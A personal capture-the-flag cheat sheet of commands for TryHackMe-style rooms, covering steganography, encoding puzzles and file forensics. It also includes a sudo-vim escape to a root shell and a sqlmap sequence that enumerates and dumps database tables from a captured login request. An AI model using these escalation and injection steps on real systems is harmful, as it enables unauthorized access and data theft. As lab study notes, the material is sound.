
Privilege Escalation
```
sudo -l     ..get /usr/bin/vim
sudo vim  
:!bash
```
ssh:
```
ssh solace@128.09.78.8
ssh -p 2222 solace@128.09.78.8
```
ftp:
```
ftp 123.87.4.8
password: anonymous
```
Open VPN:
```
sudo openvpn <VPNfile>
```
find
```bash
find / -name "*.conf" 2>/dev/null
find / -type d -name "*sol*"
find / -type f -name "*.conf"

find / -type f \( -name 8V2L -o -name bny0 -o -name c4ZX -o -name D8B3 -o -name FHl1 -o -name oiM0 -o -name PFbD -o -name rmfX -o -name SRSq -o -name uqyw -o -name v2Vb -o -name X1Uy \) 2>/dev/null

find / -type f \( -name 8V2L -o -name bny0 -o -name c4ZX -o -name D8B3 -o -name FHl1 -o -name oiM0 -o -name PFbD -o -name rmfX -o -name SRSq -o -name uqyw -o -name v2Vb -o -name X1Uy \) -exec ls -l {} \; 2>/dev/null

-o or, -exec standard input for ls

-exec grep -E -o “([0–9]{1,3}[\.]){3}[0–9]{1,3}” *   use for greping IP

-exec ls -ln
-exec sha1sum
-exec ls -ln
```
group and user of files:
```bash
ls -l
find / -group GroupName 2>/dev/null
```
decrypt:
```bash
echo "hsgagjxmskajj==" | base64 -d

```
steghide:
```bash
steghide extract -sf image.jpg -p "password"

steghide extract -sf image.jpg -p ""

steghide extract -sf image.jpg -p "password" -f

steghide embed -cf cover.jpg -ef secret.txt -p "password"

steghide embed -cf cover.jpg -ef secret.txt -p ""

steghide embed -cf cover.jpg -ef secret.txt -p "password" -z 9
```

metadata website:
https://jimpl.com/  meta data finder for images.

reverse and read:
```bash
file <fileName>
strings <fileName> | grep "flag{"
```

NB. For **rot13** use cyberchef also, then click amount!

Accidentally missed up with PNG file:
```bash
xxs --plain spoil.png | cat
check the standard magic number of png from google
Then edit the first 16 hex digits with cyberchef with HEX recip
```

Hidden flag inside THM social acount:
```
Check google dorking:
site:"reddit.com" & intext:"THM"
```

BrainFuck/ BinaryFuck:
- like:
```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>++++++++++++++.------------.+++++.>+++++++++++++++++++++++.<<++++++++++++++++++.>>-------------------.---------.++++++++++++++.++++++++++++.<++++++++++++++++++.+++++++++.<+++.+.>----.>++++.
```
- To decode it use site: https://www.dcode.fr/brainfuck-language?__r=1.cba1266e5afa8a0195e2a4ef9f78fd8f

If S1, S2....then crack values:
- Use **XOR** online calculator
- NB. You need to use the output as ASCII (base256) to get the flag.

**Exfilterate** file/image:
```
binwalk -B image.jpg
cp image.jpj image.zip
unzip image.jpg
cat <newTXTfile>
```

**StegSolver**: if the image is dark, to look the data
```bash
>	wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
>	chmod +x stegsolve.jar
>	java -jar stegsolver.jar
>	# In CTF/tools!
```

Wayback Machine: for time travel
https://web.archive.org

Vigenere Decode:
- Try to insert the key, and decipher the text
- Use CyberChef
- eg. search "Vigenere Decode", add key "THM", decode "MYKAHODTQ{something}"  - then look the result

If you get Decimal number and to convert to text:
- use: https://www.rapidtables.com/convert/number/decimal-to-hex.html
- first convert: Decimal to Hexadecimal,
- Then convert: Hexadecimal to Text

Wifi password Capture using Wireshark:
- use `http.request.method==GET`
- Then, follow -> Http Stream -> get the flag


**NB**. Save your **IP** in `/etc/hosts`. 

VIM `:%!`

**NB**. Sometimes decode the encoding many times, by drag and drop the reciep again and again. 
- **eg**. Base64 (x4), This gives the final result. or the hidden folder name.
	- Then check the source code of that hidden path or do any thing you want.

SQLmap:
- Using burp capture the POST request for login page then, select whole request -> rightClick and then copy to file request.txt, then:
```bash
>	sqlmap -r request.txt --dbs --level 3 --risk 3
sqlmap -r request.txt  --level 3 --risk 3 -D THM_f0und_m3 --tables
>	sqlmap -r request.txt  --level 3 --risk 3 -D THM_f0und_m3 -T nothing_inside --columns
>	sqlmap -r request.txt  --level 3 --risk 3 -D THM_f0und_m3 -T nothing_inside --dump-all
```
These commands helped me to enumerate the database, FLAG:
- `THM_f0und_m3` is in my case, so use your retrieved found Database (from the results of the first command).
- `nothing_inside` is a table retrieved result.
- For other additional username and password attack you can continue.
- Using credentials you can logedin 
	- and also look for the response, after successful.
- Check by changing cookie or other header values eg. from 0 to 1

Sometimes by the response hint add some headers like:
- Referer: example.com
- etc..

Using https://rapidtables.com **bin->dec->hex->text**

